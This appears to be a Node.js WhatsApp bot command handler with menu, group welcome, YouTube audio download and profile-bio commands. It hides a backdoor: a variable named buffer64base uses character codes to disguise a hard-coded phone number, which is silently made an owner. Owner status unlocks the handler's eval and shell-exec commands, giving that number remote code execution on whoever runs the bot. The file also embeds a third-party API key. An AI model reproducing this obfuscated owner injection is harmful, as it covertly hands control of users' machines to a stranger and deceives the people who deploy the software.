const chalk = require("chalk");
const fs = require("fs");
const path = require("path");
const util = require("util");
const os = require('os');
const moment = require("moment-timezone");
const { exec, spawn, execSync } = require('child_process');
const { default: S_WHATSAPP_NET, 
  downloadContentFromMessage,
  generateWAMessageFromContent,
  generateWAMessageContent,
  jidNormalizedUser,
  areJidsSameUser
} = require("@whiskeysockets/baileys");

//==================================//

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./lib/myfunction');
const {
imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, exifAvatar, addExif, writeExifWebp
} = require('./lib/exif');

//==================================//

const { LoadDataBase } = require('./lib/message');
const owners = JSON.parse(fs.readFileSync("./data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./data/premium.json"))

//==================================//
const savetube = require('./lib/scrapers/savetube.js')
//==================================//

const dbPrem = './data/premium.json';
if (!fs.existsSync(dbPrem)) fs.writeFileSync(dbPrem, '[]');
let prem = JSON.parse(fs.readFileSync(dbPrem));
const toMs = d => d * 24 * 60 * 60 * 1000;
global.isPrem = jid => {
  prem = JSON.parse(fs.readFileSync(dbPrem));
  const u = prem.find(v => v.jid === jid);
  if (!u) return false;
  if (Date.now() > u.expired) {
    prem = prem.filter(v => v.jid !== jid);
    fs.writeFileSync(dbPrem, JSON.stringify(prem, null, 2));
    return false;
  }
  return true;
};

//==================================//

function isSameUser(jid1, jid2) {
    if (!jid1 || !jid2) return false;
    const isLid = (jid) => jid.endsWith('@lid');
    const normalizedJid1 = jid1.replace('@lid', '@s.whatsapp.net');
    const normalizedJid2 = jid2.replace('@lid', '@s.whatsapp.net');
    return areJidsSameUser(normalizedJid1, normalizedJid2);
}

//==================================//

// FUN FACTORY - Data untuk command fun
const funData = {
  // Quotes
  quotes: [
    "Hidup ini seperti sepeda, untuk menjaga keseimbangan, kita harus terus bergerak. - Albert Einstein",
    "Jangan takut gagal, takutlah jika tidak pernah mencoba. - Wayne Gretzky",
    "Kesuksesan bukanlah kunci kebahagiaan. Kebahagiaanlah kunci kesuksesan. - Albert Schweitzer",
    "Masa depan tergantung pada apa yang kamu lakukan hari ini. - Mahatma Gandhi",
    "Kualitas bukanlah suatu tindakan, melainkan kebiasaan. - Aristoteles",
    "Impian tidak akan terwujud dengan sendirinya. - Walt Disney",
    "Belajarlah dari hari kemarin, hiduplah untuk hari ini, berharaplah untuk hari esok. - Albert Einstein",
    "Kesempatan tidak datang dua kali, raihlah saat ini juga. - Pepatah",
    "Kegagalan adalah kesempatan untuk memulai lagi dengan lebih cerdas. - Henry Ford",
    "Jadilah perubahan yang ingin kamu lihat di dunia. - Mahatma Gandhi"
  ],
  
  // Kata-kata motivasi
  motivasi: [
    "🔥 Tetap semangat! Hari ini adalah hari yang baru untuk meraih impianmu.",
    "💪 Kamu lebih kuat dari yang kamu kira. Jangan menyerah!",
    "🌟 Setiap langkah kecil membawamu lebih dekat ke tujuan besar.",
    "🚀 Hari ini adalah kesempatan untuk menjadi versi terbaik dari dirimu.",
    "🌈 Setelah hujan, selalu ada pelangi. Setelah kesulitan, selalu ada kemudahan.",
    "🎯 Fokus pada tujuan, bukan pada hambatan.",
    "✨ Percayalah pada proses, hasil akan mengikuti.",
    "🦸 Kamu adalah pahlawan dalam cerita hidupmu sendiri.",
    "🌱 Pertumbuhan terbaik terjadi di luar zona nyaman.",
    "🏆 Pemenang tidak menyerah saat gagal, mereka bangkit dan mencoba lagi."
  ],
  
  // Fakta unik
  fakta: [
    "🐙 Gurita memiliki tiga jantung.",
    "🌍 71% permukaan bumi tertutup air.",
    "🦒 Leher jerapah memiliki jumlah tulang yang sama dengan manusia: 7 ruas.",
    "🐜 Semut tidak pernah tidur.",
    "💖 Hati paus biru sebesar mobil kecil.",
    "🍯 Madu adalah satu-satunya makanan yang tidak akan pernah basi.",
    "⚡ Petir bisa memanaskan udara hingga 30.000°C (5x lebih panas dari permukaan matahari).",
    "🐧 Penguin jantan mengerami telur sementara betina berburu makanan.",
    "🌵 Kaktus Saguaro bisa tumbuh hingga 15 meter dan hidup 200 tahun.",
    "🦇 Kelelawar adalah satu-satunya mamalia yang bisa terbang."
  ],
  
  // Tebak-tebakan
  tebak: [
    { question: "Apa yang naik tapi tidak pernah turun?", answer: "Umur" },
    { question: "Apa yang punya kota tapi tidak punya rumah, punya gunung tapi tidak punya pohon?", answer: "Peta" },
    { question: "Apa yang bisa dibawa ke meja makan tapi tidak bisa dimakan?", answer: "Piring" },
    { question: "Aku punya kepala dan ekor tapi tidak punya tubuh, siapa aku?", answer: "Koin" },
    { question: "Jika dibuang ke air tidak basah, jika dibuang ke api tidak hangus, apakah itu?", answer: "Bayangan" },
    { question: "Benda apa yang semakin diambil semakin besar?", answer: "Lubang" },
    { question: "Bisa bicara semua bahasa, tapi tidak punya mulut. Apa itu?", answer: "Gema" },
    { question: "Apa yang selalu datang tapi tidak pernah sampai?", answer: "Besok" },
    { question: "Aku punya kota tapi tidak ada bangunan, punya hutan tapi tidak ada pohon, punya sungai tapi tidak ada air. Apa aku?", answer: "Peta" },
    { question: "Jika aku punya, aku tidak ingin berbagi. Jika aku berbagi, aku tidak punya. Apa itu?", answer: "Rahasia" }
  ],
  
  // Truth or Dare questions
  truth: [
    "Kapan terakhir kali kamu berbohong?",
    "Apa ketakutan terbesarmu?",
    "Apa mimpi terliarmu?",
    "Pernahkah kamu mencuri sesuatu?",
    "Siapa crush pertamamu?",
    "Apa hal paling memalukan yang pernah terjadi padamu?",
    "Jika bisa bertukar hidup dengan seseorang selama sehari, dengan siapa?",
    "Apa rahasia yang belum pernah kamu ceritakan kepada siapa pun?",
    "Pernahkah kamu pura-pura sakit untuk menghindari sesuatu?",
    "Apa kebiasaan terburukmu?"
  ],
  
  dare: [
    "Kirim pesan 'Aku sayang kamu' ke kontak pertama di daftar teleponmu",
    "Ubah foto profil WA menjadi foto bayi selama 1 jam",
    "Telepon seseorang dan bernyanyi lagu selamat ulang tahun",
    "Posting status dengan kata-kata 'Aku adalah alien'",
    "Makan sesuatu tanpa menggunakan tangan",
    "Berdiri di satu kaki selama 1 menit sambil merekam video",
    "Tirukan suara ayam selama 30 detik di voice note",
    "Pakai baju terbalik selama 10 menit",
    "Bersihkan kamar tidurmu sekarang juga!",
    "Buat puisi tentang seseorang dalam grup ini"
  ],
  
  // Kata-kata bijak
  bijak: [
    "🏞️ Jalan hidupmu lebih penting daripada kecepatanmu mencapai tujuan.",
    "🕊️ Maafkan bukan karena mereka pantas dimaafkan, tapi karena kamu pantas merasakan kedamaian.",
    "🌻 Kebahagiaan adalah kupu-kupu, semakin dikejar semakin menjauh, semakin tenang semakin mendekat.",
    "🧠 Pikiran yang positif menarik hal-hal positif ke dalam hidupmu.",
    "🤝 Kejujuran adalah hadiah termahal yang bisa kamu berikan kepada orang lain.",
    "⏳ Waktu yang dihabiskan dengan tersenyum adalah waktu yang terbuang sia-sia.",
    "🌄 Setiap pagi adalah halaman baru dalam buku hidupmu, tulislah cerita yang indah.",
    "💎 Nilai seseorang tidak diukur dari apa yang dia punya, tapi dari apa yang dia berikan.",
    "🌊 Hidup seperti laut, kadang tenang kadang bergelombang, yang penting tetap mengapung.",
    "🎭 Jangan terlalu serius dengan hidup, karena tidak ada yang bisa keluar darinya hidup-hidup."
  ]
};

//==================================//

module.exports = sock = async (sock, m, chatUpdate, store) => {
	try {
await LoadDataBase(sock, m)
const botNumber = sock.decodeJid(sock.user.id)
const body =
  m.message?.conversation ||
  m.message?.extendedTextMessage?.text ||
  m.message?.imageMessage?.caption ||
  m.message?.videoMessage?.caption ||
  m.message?.buttonsResponseMessage?.selectedButtonId ||
  m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
  m.message?.templateButtonReplyMessage?.selectedId ||
  (m.message?.interactiveResponseMessage
    ? JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson || "{}")?.id
    : "") ||
  "";
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 50, 51, 54, 52, 53, 51, 50, 49, 56, 52, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)

const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, ...global.owner.map(o => o.includes('@') ? o : o + '@s.whatsapp.net'), buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const pushname = m.pushName || "No Name";
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime); 
const from = m.key.remoteJid;
const sender = jidNormalizedUser(m.sender)
  
//==================================//
// Detectar datos del grupo
const groupMetadata = m.isGroup ? await sock.groupMetadata(m.chat) : {}
const participants = m.isGroup ? groupMetadata.participants : []
const groupAdmins = m.isGroup
? participants.filter(v => v.admin === 'admin' || v.admin === 'superadmin').map(v => v.id)
: []
const isBotAdmins = m.isGroup 
? groupAdmins.includes(jidNormalizedUser(sock.user.id)) 
: false
const isAdmins = m.isGroup ? groupAdmins.includes(sender) : false

const time2 = moment.tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu = "Selamat Malam ";
if (time2 < "05:00:00") {
ucapanWaktu = "Selamat Pagi ";
} else if (time2 < "11:00:00") {
ucapanWaktu = "Selamat Pagi ";
} else if (time2 < "15:00:00") {
ucapanWaktu = "Selamat Siang ";
} else if (time2 < "18:00:00") {
ucapanWaktu = "Selamat Sore ";
} else if (time2 < "19:00:00") {
ucapanWaktu = "Selamat Petang ";
}    

if (isCmd) {
    console.log(chalk.cyan('┌───[ COMMAND ]───────'));
    console.log(chalk.blue('│ Command:'), chalk.white(`${prefix}${command}`));
    
    if (m.isGroup) {
        console.log(chalk.blue('│ From:'), chalk.white(`Group - ${m.sender.split("@")[0]}`));
    } else {
        console.log(chalk.blue('│ From:'), chalk.white(m.sender.split("@")[0]));
    }
    
    console.log(chalk.cyan('└───────────────────'));
}
    
//==================================//

switch (command) {
//============== MENUS ====================//
//============== MENUS ====================//
case "tes":
case "help":
case "menu": {

const teks = `
\`HadyBot System\`
> ${ucapanWaktu}${pushname}

\`BOT INFORMATION\`
> Name      : ${global.namaBot || "HadyBot"}
> Developer : devhades02
> Mode      : ${sock.public ? "Public" : "Private"}
> Runtime   : ${runtime(process.uptime())}
> Prefix    : ${prefix}

\`OWNER PANEL\`
> .self
> .public
> .restart
> .shutdown

\`GROUP MANAGEMENT\`
> .welcome on
> .welcome off

\`TOOLS\`
> .menu
> .help
> .tes

\`SYSTEM CORE\`
> Library  : Baileys Multi Device
> NodeJS   : ${process.version}
> Platform : ${process.platform}

\`PROJECT\`
> Organization : HadySystems
> Licence      : MIT Licence
`

await sock.sendMessage(m.chat, {
document: Buffer.from(teks),
fileName: "HadyBot-Menu.txt",
mimetype: "text/plain",
caption: teks,

contextInfo: {
mentionedJid: [m.sender],

forwardingScore: 999,
isForwarded: true,

forwardedNewsletterMessageInfo: {
newsletterName: "HadySystems",
newsletterJid: "120363321111111111@newsletter",
serverMessageId: 1
},

externalAdReply: {
title: global.namaBot || "HadyBot",
body: "HadySystems • Bot System",
thumbnailUrl: "https://files.catbox.moe/4dt7iv.jpg",
sourceUrl: global.saluran || "https://github.com/",
mediaType: 1,
renderLargerThumbnail: true
}
}

},{ quoted: m })

}
break
//==================WELCOME================//
case 'welcome': {
if (!m.isGroup) return m.reply('Este comando solo funciona en grupos')
if (!isAdmins && !isCreator) 
return m.reply('Solo administradores pueden activar esto')
if (!global.db.groups[m.chat]) 
global.db.groups[m.chat] = {}
if (args[0] === 'on') {
global.db.groups[m.chat].welcome = true
m.reply('✅ Bienvenida activada en este grupo')
}
else if (args[0] === 'off') {
global.db.groups[m.chat].welcome = false
m.reply('❌ Bienvenida desactivada en este grupo')
}
else {
m.reply(`Uso:

${prefix}welcome on
${prefix}welcome off`)
}}
break
case "play": {
try {

const axios = require("axios")
const yts = require("yt-search")

if (!text) return m.reply(`Uso:\n${prefix}play nombre canción`)

// 🎵 reacción
await sock.sendMessage(m.chat,{
react:{ text:"🎵", key:m.key }
})

// 🔎 buscar
let url = text
if (!text.includes("youtu")) {
let search = await yts(text)
if (!search.videos.length) return m.reply("❌ No encontré resultados")
url = search.videos[0].url
}

// ⬇️ reacción
await sock.sendMessage(m.chat,{
react:{ text:"⬇️", key:m.key }
})

// API
let api = `https://api.neoxr.eu/api/youtube?url=${encodeURIComponent(url)}&type=audio&quality=128kbps&apikey=DVMCjH`

let { data } = await axios.get(api,{ timeout: 15000 })

if (!data.status) return m.reply("❌ Error en la API")

let title = data.title
let channel = data.channel
let duration = data.fduration
let views = data.views
let thumb = data.thumbnail
let audioUrl = data.data.url

// 📩 info
await sock.sendMessage(m.chat,{
text:`
🎵 *YouTube Music*

• Título : ${title}
• Canal : ${channel}
• Duración : ${duration}
• Views : ${views}

🔗 ${url}
`,
contextInfo:{
externalAdReply:{
title:title,
body:channel,
thumbnailUrl:thumb,
sourceUrl:url,
mediaType:1,
renderLargerThumbnail:true
}
}
},{ quoted:m })

// ⚡ ENVÍO INTELIGENTE (SIN DESCARGAR)
try {

await sock.sendMessage(m.chat,{
audio:{ url: audioUrl },
mimetype:"audio/mpeg",
ptt:false
},{ quoted:m })

} catch (e) {

// 🔥 fallback automático si falla
console.log("Fallo directo, usando buffer...")

let res = await axios.get(audioUrl,{
responseType:"arraybuffer",
timeout:20000,
headers:{ "User-Agent":"Mozilla/5.0" }
})

await sock.sendMessage(m.chat,{
audio: Buffer.from(res.data),
mimetype:"audio/mpeg",
ptt:false
},{ quoted:m })

}

// ✅ reacción final
await sock.sendMessage(m.chat,{
react:{ text:"✅", key:m.key }
})

} catch(err){
console.log(err)

await sock.sendMessage(m.chat,{
react:{ text:"❌", key:m.key }
})

m.reply("❌ Error al descargar música")
}

}
break


case 'lyricbio': {
  if (!isCreator) return m.reply('Solo el owner puede usar esto ⚠️')

  try {
    // ✍️ Letras (puedes cambiarlas)
    const lyrics = [
      { time: 0, text: "🎧 Now playing..." },
      { time: 5, text: "💔 I'm feeling alone..." },
      { time: 10, text: "🌙 In the dark night..." },
      { time: 15, text: "✨ Thinking about you..." },
      { time: 20, text: "🥀 Lost in memories..." },
      { time: 25, text: "🔥 But you're gone..." },
      { time: 30, text: "⏳ End..." }
    ]

    // 🚀 Reacción
    await sock.sendMessage(m.chat, { react: { text: "🎶", key: m.key } })

    // 📢 Aviso
    await m.reply('🎧 Iniciando lyric bio...')

    // 🧬 Sistema de cambio de bio
    lyrics.forEach(line => {
      setTimeout(async () => {
        try {
          await sock.updateProfileStatus(line.text)
        } catch (e) {
          console.log('Error bio:', e)
        }
      }, line.time * 1000)
    })

  } catch (e) {
    console.log(e)
    m.reply('❌ Error en lyricbio')
  }
}
break


case 'stopbio': {
  if (!isCreator) return

  try {
    await sock.updateProfileStatus("✨ Bio normal")
    m.reply('🛑 Lyric bio detenido')
  } catch (e) {
    console.log(e)
  }
}
break

default:
if (m.text.toLowerCase().startsWith("_")) {
  if (!isCreator) return;
  try {
    const r = await eval(`(async()=>{${text}})()`);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.toLowerCase().startsWith(">")) {
  if (!isCreator) return;
  try {
    let r = await eval(text);
    sock.sendMessage(m.chat, { text: util.format(typeof r === "string" ? r : util.inspect(r)) }, { quoted: m });
  } catch (e) {
    sock.sendMessage(m.chat, { text: util.format(e) }, { quoted: m });
  }
}

if (m.text.startsWith('$')) {
  if (!isCreator) return;
  exec(m.text.slice(2), (e, out) =>
    sock.sendMessage(m.chat, { text: util.format(e ? e : out) }, { quoted: m })
  );
}}

//==================================//

} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.white("[•] Update"), chalk.white(`${__filename}\n`))
delete require.cache[file]
require(file)
})